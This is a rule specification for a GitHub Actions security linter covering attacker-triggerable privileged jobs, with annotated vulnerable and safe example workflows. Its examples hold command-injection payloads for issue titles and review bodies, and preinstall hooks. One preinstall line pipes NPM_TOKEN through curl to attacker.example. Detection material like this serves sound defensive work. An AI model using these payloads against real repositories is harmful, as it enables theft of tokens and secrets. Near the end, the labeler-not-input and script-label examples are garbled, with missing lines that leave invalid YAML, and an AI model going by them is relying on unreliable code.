## dangerous-triggers

- problem: a job that an attacker's event runs, which no one approves, holds a GITHUB_TOKEN that may write or the repository's secrets: a flaw that runs the attacker's code there gives them all of it
- expected: a job of an attacker's event with permissions of only the scopes it needs and no secrets, or one a person approves
- severity: high (the worst of its kinds)
- targets: workflow
- facets:
  - weakness: excessive-privilege
  - attack-means: none
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- dangerous-triggers.token-write
  - detected: the job runs on {privileged_on}, which an attacker triggers, with no approval and a GITHUB_TOKEN that may write
  - arguments:
    - {privileged_on}: The privileged events that the job can run on, each event named once.
  - consequence: a flaw that runs the attacker's code in the job, such as an injection or a checkout of their code, gives them a token that pushes, releases and writes what the job may
  - remedy: write permissions on the job with only the scopes it needs, or have a person approve it with an environment that has required reviewers
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: repo.default-token-write (provider: repo-setting), repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
  - preconditions: privileged-job, no-approval, token-writes, flaw-in-job, app-status-check
  - true positives:
    - .github/workflows/labeled.yml (workflow, true-positive)
      ```yaml
      # situation: the workflows of fooagen/zellij
      #   (https://github.com/fooagen/zellij/tree/039c8d5962dd341bb58dd7dcd09eb2cf7389ac7a/.github).
      #   For the example, build-artefacts.yaml is named labeled.yml and the
      #   directory docs is named pages. In the workflows, labeler.yaml runs
      #   actions/labeler on pull_request_target with a personal access token; the
      #   configuration .github/labeler.yaml adds the label documentation to a pull
      #   request that changes a Markdown file under pages/; labeled.yml runs on
      #   pull_request_target on labeled when the label is documentation, with the
      #   permission pull-requests write. On 2026-04-25 a pull request from a fork
      #   got the label, and the labeled run succeeded.
      # reason: a label that the personal access token adds starts the labeled run
      #   with no person approving the run, and the token of the run can write.
      # attack-value: the file pages/package.json in the pull request's merge commit = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
      # attack-run-behavior: the attacker opens a pull request from a fork that
      #   changes a .mdx file under pages/; actions/labeler adds the label
      #   documentation, which starts labeled.yml with a token that can write to the
      #   pull requests; code that a flaw of the job runs gets the token.
      name: Build Docs Artefacts

      on:
        pull_request_target:
          types: [labeled]

      permissions:
        contents: read
        pull-requests: write

      jobs:
        build-and-greet:
          if: github.event.label.name == 'documentation'
          runs-on: ubuntu-latest

          steps:
            - name: Checkout PR code
              uses: actions/checkout@v4
              with:
                ref: refs/pull/${{ github.event.number }}/merge

            - name: Setup Node.js
              uses: actions/setup-node@v4
              with:
                node-version: 20
                cache: npm
                cache-dependency-path: 'pages/package-lock.json'

            - name: Install dependencies
              working-directory: pages
              run: npm ci

            - name: Build Docusaurus artifacts
              working-directory: pages
              run: npm run build

            - name: Post Welcome Comment
              uses: actions/github-script@v7
              with:
                script: |
                  const gifUrl = "https://media.giphy.com/media/KJ1f5iTl4Oo7u/giphy.gif";

                  github.rest.issues.createComment({
                    issue_number: context.issue.number,
                    owner: context.repo.owner,
                    repo: context.repo.repo,
                    body: `👋 **Thanks for contributing to our documentation!**\n\nThe artifacts have been successfully built for this pull request.\n\n![Thank You GIF](${gifUrl})`
                  })
      ```
      - finding on: .github/workflows/labeled.yml, .github/workflows/labeler.yaml
      - .github/labeler.yaml (repo-file)
        ```yaml
        documentation:
          - changed-files:
              - any-glob-to-any-file:
                  - 'pages/**/*.md'
                  - 'pages/**/*.mdx'
              - all-globs-to-all-files:
                  - 'pages/**/*.md'
                  - 'pages/**/*.mdx'
        ```
      - .github/workflows/labeler.yaml (workflow)
        ```yaml
        name: "Auto Labeler"

        on:
          pull_request_target:
            types: [opened]

        permissions:
          contents: read
          pull-requests: write

        jobs:
          triage:
            runs-on: ubuntu-latest
            steps:
              - name: Apply Documentation Label
                uses: actions/labeler@v5
                with:
                  configuration-path: .github/labeler.yaml
                  sync-labels: true
                  repo-token: ${{ secrets.PAT }}
        ```
    - token-write.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/dangerous-triggers-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   token-write (token-write.yml) of the rule, with on: workflow_call in
      #   place of the on of token-write.yml. The job passes its secrets with
      #   secrets: inherit. In the true positive, on issues, a job whose token may
      #   write contents echoes the issue's title, written in by ${{ }}.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: issues
      #   runs the job for anyone who opens an issue, with no approval, and
      #   contents: write gives its token write; the title written in by ${{ }} is
      #   a flaw that runs the opener's code in the job that holds that token.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: opening the issue starts the job a, which has no if
      #   and waits for no approval, with a token that has contents: write; the
      #   script becomes echo ""; echo PWNED; echo "", and the shell runs echo
      #   PWNED as a command, so any command the attacker writes in its place runs
      #   in the job that holds that token.
      on: issues
      jobs:
        c:
          uses: example-org/dangerous-triggers-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - token-write.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a job whose token may write contents echoes the
      #   issue's title, written in by ${{ }}.
      # reason: issues runs the job for anyone who opens an issue, with no
      #   approval, and contents: write gives its token write; the title written
      #   in by ${{ }} is a flaw that runs the opener's code in the job that holds
      #   that token.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: opening the issue starts the job a, which has no if
      #   and waits for no approval, with a token that has contents: write; the
      #   script becomes echo ""; echo PWNED; echo "", and the shell runs echo
      #   PWNED as a command, so any command the attacker writes in its place runs
      #   in the job that holds that token.
      on: issues
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions:
            contents: write
          steps:
            - run: echo "${{ github.event.issue.title }}"
      ```
  - true negatives:
    - token-write.folded-false-if.yml (workflow, true-negative)
      ```yaml
      # situation: on issues, the job's if is ${{ 'false' }}, a string literal
      #   alone in ${{ }}, and the job, whose token may write contents, puts the
      #   issue's title into a run by ${{ }}.
      # reason: GitHub reads the string of a string literal alone in ${{ }} as the
      #   expression of the if, so the if of the job is the expression false, and
      #   the job never runs: no one who opens an issue starts the job that holds
      #   the token.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: opening the issue starts the workflow, and GitHub
      #   reads the if of the job a as false, so the job a is skipped and no
      #   script runs.
      on: issues
      jobs:
        a:
          if: ${{ 'false' }}
          runs-on: ubuntu-latest
          permissions:
            contents: write
          steps:
            - run: echo "${{ github.event.issue.title }}"
      ```
    - token-write.folded-read-all.yml (workflow, true-negative)
      ```yaml
      # situation: on issues, the job's permissions are ${{ 'read-all' }}, a
      #   folded string, and a step writes the issue's title into a run by ${{ }}.
      # reason: GitHub reads the folded ${{ 'read-all' }} as read-all, so every
      #   scope of the job's token only reads, and the job reads no secret: code
      #   run through the title gets no token that writes.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: opening the issue starts the job a, and the script
      #   becomes echo ""; echo PWNED; echo "", so echo PWNED runs as a command;
      #   the job's token reads every scope and writes none, and the job reads no
      #   secret.
      on: issues
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions: ${{ 'read-all' }}
          steps:
            - run: echo "${{ github.event.issue.title }}"
      ```
    - token-write.yml (workflow, true-negative)
      ```yaml
      # situation: on issues, the job, with permissions: {}, puts the issue's
      #   title into a run by ${{ }}.
      # reason: with permissions: {} the job's token has no scope, so it writes
      #   nothing, and the job reads no secret: code run through the title gets
      #   neither.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: opening the issue starts the job a, and the script
      #   becomes echo ""; echo PWNED; echo "", so echo PWNED runs as a command;
      #   the job's token has no scope (permissions: {}) and the job reads no
      #   secret, so a command in its place finds no token that writes and no
      #   secret.
      on: issues
      jobs:
        a:
          runs-on: ubuntu-latest
          permissions: {}
          steps:
            - run: echo "${{ github.event.issue.title }}"
      ```
- dangerous-triggers.secrets
  - detected: the job runs on {privileged_on}, which an attacker triggers, with no approval, and reads the secrets {secrets}
  - arguments:
    - {privileged_on}: The privileged events that the job can run on, each event named once.
    - {secrets}: The names of the secrets that the job reads; for a job that calls a reusable workflow, the names of the secrets that GitHub passes to the runners of the jobs of the called workflow. The single value \* when the job, or a job of the reusable workflow that the job calls with secrets: inherit, reads the secrets without naming the secrets, or when the job calls with secrets: inherit a reusable workflow whose contents the linter does not have. For a job that passes secrets one by one to a reusable workflow whose contents the linter does not have, every passed secret.
  - consequence: a flaw that runs the attacker's code in the job, such as an injection or a checkout of their code, gives them the secrets and what they open past the repository
  - remedy: move the secrets to a job that the attacker's events do not run, or have a person approve it with an environment that has required reviewers
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
  - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
  - preconditions: privileged-job, no-approval, reads-secrets, flaw-in-job, app-status-check
  - incidents: spotbugs-2024
  - true positives:
    - .github/workflows/labeled.yml (workflow, true-positive)
      ```yaml
      # situation: labeler.yml runs actions/labeler on pull_request_target with a
      #   personal access token; the configuration .github/labeler.yml adds the
      #   label safe-to-test to a pull request that changes a file under site/;
      #   labeled.yml runs on pull_request_target on labeled when the label is
      #   safe-to-test, and the job reads the secret NPM_TOKEN, checks out the head
      #   of the pull request and runs npm ci.
      # reason: the attacker chooses the files that the pull request changes, which
      #   actions/labeler reads, and a label that a personal access token adds
      #   starts the labeled run, so no person approves the run before the label
      #   starts the run.
      # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
      # attack-run-behavior: the attacker opens a pull request from a fork that
      #   changes a file under site/ and the files of the attack; actions/labeler
      #   adds the label safe-to-test, which starts labeled.yml, and npm ci runs the
      #   preinstall script of the pull request, which prints PWNED, with NPM_TOKEN
      #   in its env.
      on:
        pull_request_target:
          types: [labeled]
      permissions: {}
      jobs:
        build:
          if: github.event.label.name == 'safe-to-test'
          runs-on: ubuntu-latest
          env:
            NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          steps:
            - uses: actions/checkout@v4.2.2
              with:
                ref: ${{ github.event.pull_request.head.sha }}
            - run: npm ci
      ```
      - finding on: .github/workflows/labeled.yml, .github/workflows/labeler.yml
      - .github/labeler.yml (repo-file)
        ```yaml
        safe-to-test:
          - changed-files:
              - any-glob-to-any-file: 'site/**'
        ```
      - .github/workflows/labeler.yml (workflow)
        ```yaml
        on: pull_request_target
        permissions: {}
        jobs:
          label:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/labeler@v5
                with:
                  repo-token: ${{ secrets.LABELER_PAT }}
        ```
    - secrets.container-credentials.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, the job `a`, with permissions: {}, reads a secret
      #   in the password of the credentials of its container.
      # reason: the event issues runs the job for anyone who opens an issue,
      #   with no approval, and the run of the job has the secrets of the
      #   repository; the runner logs in to the registry with the value of
      #   REGISTRY_PASSWORD, so the secret is in the memory of the runner on the
      #   host (not in the env of a step), where a flaw in the job would let the
      #   code of the attacker read the secret.
      # attack: the attacker opens an issue, and a flaw in the job runs the code
      #   of the attacker in the job (in this example, the step of the job runs
      #   only echo).
      # attack-run-behavior: the issue starts the job `a`; the runner logs in to
      #   ghcr.io with the username u and the value of REGISTRY_PASSWORD to pull
      #   ghcr.io/o/i:1, and the steps run in that container; the value of
      #   REGISTRY_PASSWORD is in the memory of the runner on the host, and the
      #   code of the attacker in the container reads that memory through the
      #   docker socket that the runner mounts in the container.
      on: issues
      permissions: {}
      jobs:
        a:
          runs-on: ubuntu-latest
          container:
            image: ghcr.io/o/i:1
            credentials:
              username: u
              password: ${{ secrets.REGISTRY_PASSWORD }}
          steps:
            - run: echo
      ```
    - .github/workflows/called.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, the job a of ci.yml calls this reusable workflow,
      #   called.yml, with secrets: inherit and permissions: {}. The job deploy of
      #   called.yml echoes the issue's title, written in by ${{ }}, and runs
      #   ./deploy with the secret DEPLOY_TOKEN in TOKEN; called.yml reads no
      #   other secret. The finding is reported on the job a of ci.yml.
      # reason: issues runs the job for anyone who opens an issue, with no
      #   approval, and GitHub passes DEPLOY_TOKEN, which the job deploy reads by
      #   name, to the runner of the job deploy; the title written in by ${{ }} is
      #   a flaw that runs the opener's code in the step whose environment has
      #   TOKEN. The finding names DEPLOY_TOKEN, not every secret: GitHub passes
      #   the runner of the job deploy only the secrets that the job deploy reads.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: opening the issue starts ci.yml, which runs
      #   the job deploy of called.yml; the script becomes echo ""; echo PWNED;
      #   echo "" && ./deploy, and the shell runs echo PWNED as a command in the
      #   step whose environment has TOKEN, set to DEPLOY_TOKEN's value; a command
      #   that the attacker writes where echo PWNED is reads the value as $TOKEN.
      on:
        workflow_call:
      permissions: {}
      jobs:
        deploy:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ github.event.issue.title }}" && ./deploy
              env:
                TOKEN: ${{ secrets.DEPLOY_TOKEN }}
      ```
      - finding on: .github/workflows/ci.yml
      - .github/workflows/ci.yml (workflow)
        ```yaml
        on: issues
        permissions: {}
        jobs:
          a:
            uses: ./.github/workflows/called.yml
            secrets: inherit
        ```
    - secrets.review.yml (workflow, true-positive)
      ```yaml
      # situation: on pull_request_review, a step echoes the review's body,
      #   written into the run: script with ${{ }}, and runs ./deploy with the
      #   secret DEPLOY_KEY in KEY.
      # reason: anyone who may comment reviews a pull request from a branch of
      #   the repository, whose run has the repository's secrets, and the body
      #   written into the run: script with ${{ }} runs their code in the step
      #   whose environment has KEY.
      # attack-value: github.event.review.body = "\"; echo PWNED; echo \""
      # attack-run-behavior: the attacker reviews an open pull request whose
      #   branch is in the repository, such as one Dependabot opened; the review
      #   starts the job a, the script becomes echo ""; echo PWNED; echo "" &&
      #   ./deploy, and echo PWNED runs in the step whose environment has KEY.
      on: pull_request_review
      permissions: {}
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ github.event.review.body }}" && ./deploy
              env:
                KEY: ${{ secrets.DEPLOY_KEY }}
      ```
    - secrets.status-commit.yml (workflow, true-positive)
      ```yaml
      # situation: on status, which an app outside GitHub Actions starts when the
      #   app writes a status for a commit, the job checks out the commit of the
      #   status (github.event.sha) and runs npm ci with a secret in its env.
      # reason: an outside CI that writes a status for a commit of a pull request
      #   from a fork starts a run of status on the default branch, and the job
      #   runs code of the pull request with the secret of the repository.
      # attack-value: the file package.json at the head of the pull request from a fork = "{\"scripts\":{\"preinstall\":\"echo $NPM_TOKEN | curl -d @- https://attacker.example\"}}"
      # attack-run-behavior: an outside CI writes a status for the commit of the
      #   pull request from a fork; the run of status checks out that commit, and
      #   npm ci runs its preinstall, which sends NPM_TOKEN to the attacker.
      on: status
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
              with:
                ref: ${{ github.event.sha }}
            - run: npm ci
              env:
                NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
      ```
    - secrets.yml (workflow, true-positive)
      ```yaml
      # situation: on issues, a step echoes the issue's title, written in by
      #   ${{ }}, and runs ./deploy with the secret DEPLOY_KEY in KEY.
      # reason: issues runs the job for anyone who opens an issue, with no
      #   approval, and, unlike pull_request from a fork, gives it the
      #   repository's secrets; the title written in by ${{ }} is a flaw that runs
      #   the opener's code in the step whose environment has KEY.
      # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
      # attack-run-behavior: opening the issue starts the job a, which has no if
      #   and waits for no approval; the script becomes echo ""; echo PWNED; echo
      #   "" && ./deploy, and the shell runs echo PWNED as a command in the step
      #   whose environment has KEY, set to DEPLOY_KEY's value, which a command in
      #   its place reads as $KEY.
      on: issues
      permissions: {}
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ github.event.issue.title }}" && ./deploy
              env:
                KEY: ${{ secrets.DEPLOY_KEY }}
      ```
  - true negatives:
    - .github/workflows/called.yml (workflow, true-negative)
      ```yaml
      # situation: a reusable workflow that reads no secret, by name or without a
      #   name: the job label echoes a word. ci.yml calls the reusable workflow on
      #   issues with secrets: inherit and permissions: {}, and both files are
      #   given to the linter.
      # reason: GitHub passes the runner of a job of a called workflow only the
      #   secrets that the job reads, so no secret is passed to the runner of the
      #   job label; with permissions: {}, a flaw in the job label gives an
      #   attacker no secret and no token that writes.
      # attack: the attacker opens an issue, and a flaw in the job label (an
      #   injection of the issue's title, for example) runs the attacker's code in
      #   the job label.
      # attack-run-behavior: the issue starts ci.yml, which runs the job label
      #   with no secret in the runner of the job label; the attacker's code finds
      #   no secret in the runner.
      on:
        workflow_call:
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - run: echo triage
      ```
      - .github/workflows/ci.yml (workflow)
        ```yaml
        on: issues
        permissions: {}
        jobs:
          triage:
            uses: ./.github/workflows/called.yml
            secrets: inherit
        ```
    - secrets.job-needs-result.yml (workflow, true-negative)
      ```yaml
      # situation: the workflow runs on pull_request_target; the job notify needs
      #   the job build, has the if needs.build.result == 'failure', and reads the
      #   secret SLACK_TOKEN.
      # reason: GitHub evaluates the if of the job notify, which calls no status
      #   function, only when the job build succeeded, where needs.build.result is
      #   success, so the if is false; when the job build fails or is skipped,
      #   GitHub skips the job notify; so the job notify does not run
      #   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/content/actions/reference/workflows-and-actions/expressions.md,
      #   status check functions).
      # attack: the attacker opens a pull request from a fork.
      # attack-run-behavior: GitHub runs the job build, and the if of the job
      #   notify is false, so the job notify does not run, and no step reads the
      #   secret.
      on: pull_request_target
      permissions: {}
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - run: echo built
        notify:
          needs: build
          if: needs.build.result == 'failure'
          runs-on: ubuntu-latest
          steps:
            - run: ./notify.sh
              env:
                SLACK_TOKEN: ${{ secrets.SLACK_TOKEN }}
      ```
    - secrets.yml (workflow, true-negative)
      ```yaml
      # situation: on push, a step puts the head commit's message into a run by
      #   ${{ }} and runs ./deploy with the secret DEPLOY_KEY.
      # reason: the job runs on push, not on an event anyone can make such as
      #   opening an issue; only those who may push to the repository start it,
      #   and they can already change ./deploy, so the message gives them nothing
      #   more.
      # attack-value: github.event.head_commit.message = "\"; echo PWNED; echo \""
      # attack-run-behavior: a commit with this message starts the job only when
      #   one who may push to the repository pushes it; then the script becomes
      #   echo ""; echo PWNED; echo "" && ./deploy, with KEY in the environment,
      #   as ./deploy, which that person can change, already runs with it.
      on: push
      permissions: {}
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - run: echo "${{ github.event.head_commit.message }}" && ./deploy
              env:
                KEY: ${{ secrets.DEPLOY_KEY }}
      ```

### undetected forms

- fork-review: a job on pull_request_review or pull_request_review_comment that runs only for a pull request from a fork, such as a job whose if: condition is github.event.pull_request.head.repo.full_name != github.repository: the run of a review that the attacker writes on the pull request of another person from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (repo.fork-pr-secrets, repo.fork-pr-write-tokens). The rule does not read the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens for the runs of a review, and does not count the run of a review of a pull request from a fork as a run of the attacker. When the attacker opened the pull request from a fork, a review of that pull request gives the attacker nothing more than the pull request itself gives: the run takes the workflow of the merge commit of the pull request (GitHub's documentation gives refs/pull/&lt;n>/merge as the ref of the run of a review), and the attacker can change that workflow in the pull request
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - example: fork-review.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_review, a step echoes the review's body,
    #   written into the run: script with ${{ }}, and runs ./deploy with the
    #   secret DEPLOY_KEY in KEY, in a job that runs only for a pull request
    #   from a fork.
    # reason: a todo (a fact): the job runs only for a pull request from a
    #   fork. Where a private repository gives secrets or a token that writes
    #   to the runs of pull requests from forks, the run of a review that the
    #   attacker writes on the pull request of another person from a fork has
    #   those secrets or that token, and the job runs for the attacker.
    # cause: the rule does not read the settings of a private repository for
    #   the runs of pull requests from forks, and does not count the run of a
    #   review of a pull request from a fork as a run of the attacker.
    # attack-value: github.event.review.body = "\"; echo PWNED; echo \""
    # attack-run-behavior: the attacker reviews the pull request of another
    #   person from a fork; the review starts the job a, and echo PWNED runs
    #   in the step whose environment has KEY.
    on: pull_request_review
    permissions: {}
    jobs:
      a:
        if: github.event.pull_request.head.repo.full_name != github.repository
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.review.body }}" && ./deploy
            env:
              KEY: ${{ secrets.DEPLOY_KEY }}
    ```
- label-approved-checkout: a job that runs only when a label is added to a pull request (pull_request_target with the activity type labeled), and whose checkout takes code that the person who adds the label did not see: a ref that moves after the label is added (refs/pull/&lt;number>/head, which follows the branch of the pull request), or the head commit at the time of the label (github.event.pull_request.head.sha), which can be a commit that the author of the pull request pushed after a review and before the label. The rule reads the label as the approval of the job. untrusted-checkout-toctou reports the checkout of a ref that moves (the kind untrusted-checkout-toctou.mutable-ref), and declares the checkout of the head commit at the time of the label as the undetected form sha-ref of untrusted-checkout-toctou
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: other-rule (rule: untrusted-checkout-toctou)
  - example: label-approved-checkout.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_target labeled, the job checks out
    #   refs/pull/<n>/head and runs npm ci, with a token that may write.
    # reason: the label approves the pull request when a maintainer adds the
    #   label, but refs/pull/<n>/head names the head of the pull request when
    #   the checkout fetches the head, not the head commit of the pull request
    #   when the label was added, so npm ci runs the code of the commit that
    #   the author pushes between the label and the fetch, with the token of
    #   the job. untrusted-checkout-toctou reports the checkout of the ref that
    #   moves.
    # cause: the rule reads the label as the approval of the job.
    # attack: after a maintainer reads the pull request and adds a label, the
    #   author of the pull request pushes to the branch of the fork a commit
    #   whose package.json has a preinstall that prints PWNED, before the
    #   checkout of the job fetches.
    # attack-run-behavior: the labeled run checks out refs/pull/<n>/head, which
    #   GitHub has moved to the pushed commit, and npm ci runs the preinstall,
    #   with the GITHUB_TOKEN of the base repository in .git/config.
    on:
      pull_request_target:
        types: [labeled]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: refs/pull/${{ github.event.pull_request.number }}/head
              allow-unsafe-pr-checkout: true
          - run: npm ci
    ```
- outside-bot-label: a label that a bot outside the repository adds, such as a bot that adds a label for a command in a comment: the settings of the bot are outside the repository, and the rule does not read whether the bot adds the label for a comment of any user
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - added attackers: triage-account, writer-pull-requests-token, app-installation-token
  - example: outside-bot-label.yml (workflow, undetected)
    ```yaml
    # situation: a bot outside the repository adds the label safe-to-test when a
    #   comment /ok-to-test is posted on a pull request; labeled.yml runs on
    #   pull_request_target on labeled when the label is safe-to-test, and the job
    #   reads the secret NPM_TOKEN, checks out the head of the pull request and
    #   runs npm ci.
    # reason: whether the bot adds the label for a comment of any user, or only
    #   for a comment of a member of the organization that owns the repository, is
    #   in the settings of the bot, which are outside the repository; when the bot
    #   adds the label for a comment of any user, no person approves the run
    #   before the label starts the run.
    # cause: the rule does not read the bots outside the repository that add
    #   labels.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork and
    #   comments /ok-to-test; when the bot adds the label for the comment, npm ci
    #   runs the preinstall script of the pull request, which prints PWNED, with
    #   NPM_TOKEN in its env.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
- labeler-pull-request: actions/labeler in a workflow on pull_request with a token other than the GITHUB_TOKEN: a run on the event pull_request for a pull request from a fork gets the secret of the token only when a private repository sends secrets to the runs of pull requests from forks (repo.fork-pr-secrets), and the rule does not read the workflows on pull_request that add labels
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - added attackers: triage-account, writer-pull-requests-token, app-installation-token
  - example: .github/workflows/labeled.yml (workflow, undetected)
    ```yaml
    # situation: labeler.yml runs actions/labeler on pull_request with a personal
    #   access token, in a private repository that sends secrets to the runs of
    #   pull requests from forks; the configuration .github/labeler.yml adds the
    #   label safe-to-test to a pull request that changes a file under site/;
    #   labeled.yml runs on pull_request_target on labeled when the label is
    #   safe-to-test, and the job reads the secret NPM_TOKEN, checks out the head
    #   of the pull request and runs npm ci.
    # reason: a run on the event pull_request for a pull request from a fork gets
    #   the personal access token only when the repository sends secrets to such
    #   runs; then a label that the token adds starts the labeled run, and no
    #   person approves the run before the label starts the run.
    # cause: the rule does not read the workflows on pull_request that add labels,
    #   and does not ask whether the repository sends secrets to the runs of pull
    #   requests from forks.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: when the repository sends secrets to the runs of pull
    #   requests from forks, the attacker opens a pull request from a fork that
    #   changes a file under site/ and the files of the attack; actions/labeler
    #   adds the label safe-to-test, which starts labeled.yml, and npm ci runs the
    #   preinstall script of the pull request, which prints PWNED, with NPM_TOKEN
    #   in its env.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
    - .github/labeler.yml (repo-file)
      ```yaml
      safe-to-test:
        - changed-files:
            - any-glob-to-any-file: 'site/**'
      ```
    - .github/workflows/labeler.yml (workflow)
      ```yaml
      on: pull_request
      permissions: {}
      jobs:
        label:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/labeler@v5
              with:
                repo-token: ${{ secrets.LABELER_PAT }}
      ```
- labeler-not-input: an execution of the linter on a list of files, not on the whole repository: the rule does not read the workflows that are not in the list, and so does not read a step of actions/labeler in a workflow that is not in the list
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: repo-file)
  - added attackers: triage-account, writer-pull-requests-token, app-installation-token
  - example: labeler-not-input.yml (workflow, undetected)
    ```yaml
    # situation: the linter is given labeled.yml alone; the repository also has a
    #   workflow that runs actions/labeler on pull_request_target with a personal

    #   NPM_TOKEN, checks out the head of the pull request and runs npm ci.
    # reason: the workflow that runs actions/labeler adds the label to the pull
    #   request of the attacker, so no person approves the run before the label
    #   starts the run.
    # cause: the run of the linter reads only the files that it names, so the rule
    #   does not read the workflow that runs actions/labeler.
    # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
    # attack-run-behavior: the attacker opens a pull request from a fork that
    #   changes a file under site/ and the files of the attack; actions/labeler
    #   adds the label safe-to-test, which starts labeled.yml, and npm ci runs the
    #   preinstall script of the pull request, which prints PWNED, with NPM_TOKEN
    #   in its env.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```
- script-label: a label that a workflow of the same repository adds from what an attacker wrote, with a token other than the GITHUB_TOKEN, by a script (gh pr edit --add-label, the labels endpoint of the REST API through gh api, addLabels of actions/github-script) or by an action other than actions/labeler: the label is on the pull request or the issue of the attacker, and the rule does not read the scripts and the actions that add labels
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: repo-file)
  - added attackers: triage-account, writer-pull-requests-token, app-installation-token
  - example: .github/workflows/labeled.yml (workflow, undetected)
    ```yaml
    # situation: labeler.yml runs on schedule and adds the label safe-to-test with
    #   gh and a personal access token to each open pull request whose title has
    #   [site]; labeled.yml runs on pull_request_target on labeled when the label

    #   a personal access token adds starts the labeled run, so no person approves
    #   the run before the label starts the run.
    # cause: the rule reads the steps of actions/labeler, and does not read the
    #   scripts that add labels.
    # attack-value: the title of the pull request = "[site] fix"
    # attack-run-behavior: the attacker opens a pull request from a fork whose
    #   title has [site]; gh adds the label safe-to-test, which starts
    #   labeled.yml, and npm ci runs the preinstall script of the pull request,
    #   which prints PWNED, with NPM_TOKEN in its env.
    on:
      pull_request_target:
        types: [labeled]
    permissions: {}

      build:
        if: github.event.label.name == 'safe-to-test'

        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
    ```

    - .github/workflows/labeler.yml (workflow)
      ```yaml

        schedule:
          - cron: '0 * * * *'

            - run: gh pr list --repo "$REPO" --search '[site] in:title' --json number -q '.[].number' | xargs -I{} gh pr edit {} --repo "$REPO" --add-label safe-to-test
      ```

- labeler-other-event: actions/labeler in a workflow on an event that is not an event of a pull request (workflow_run, schedule), with the number of a pull request in pr-number: the step that finds the number of the pull request and gives the number to pr-number decides which pull request actions/labeler labels, and the rule does not read the step that finds the number
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
